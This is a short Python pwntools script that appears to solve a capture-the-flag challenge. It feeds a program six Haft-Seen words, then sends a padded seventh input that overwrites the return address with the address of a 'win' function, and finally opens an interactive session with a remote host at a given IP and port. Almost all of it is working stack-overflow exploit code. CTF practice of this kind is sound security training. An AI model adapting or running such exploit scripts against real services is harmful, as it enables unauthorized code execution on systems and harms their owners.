#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.DEBUG:
        gdb.attach(p)
else:
    p = remote("164.92.176.247", 5002)

seens = [b'Sonbol', b'Sabzeh', b'Seer', b'Seeb', b'Senjed', b'Samanu', b'Serkeh']

for i in range(6):
	p.sendlineafter(b'Seen: ', seens[i])

input()

payload = seens[6] + b'\0'*2
payload = payload.ljust(0x28, b'a')
payload += p64(exe.sym['win'])
p.sendlineafter(b'Seen: ', payload)

p.interactive()